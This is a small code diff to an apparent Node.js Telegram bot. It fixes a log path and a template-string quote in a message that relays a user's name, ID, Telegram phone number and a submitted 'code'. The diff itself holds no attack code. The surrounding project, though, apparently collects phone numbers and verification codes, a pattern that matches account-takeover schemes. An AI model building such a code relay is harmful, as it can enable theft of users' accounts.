@@ -138,7 +138,7 @@ app.use(express.json());
 
 // API endpoint na tinatawag ng WebApp
 app.post("/api/log-code", async (req, res) => {
-  console.log("Received /api-log-code body:", req.body);
+  console.log("Received /api/log-code body:", req.body);
 
   const { code, tgUser } = req.body || {};
 
@@ -226,7 +226,7 @@ bot.on("callback_query", async (ctx) => {
     "🔔 Verification request\n\n" +
     `👤 User: ${displayName}\n` +
     `🆔 ID: ${userId || "N/A"}\n` +
-    `📱 Telegram phone: ${telegramPhone}\n\n" +
+    `📱 Telegram phone: ${telegramPhone}\n\n` +
     `🔑 Code: ${code}\n\n` +
     `Status: ${statusText}`;
 
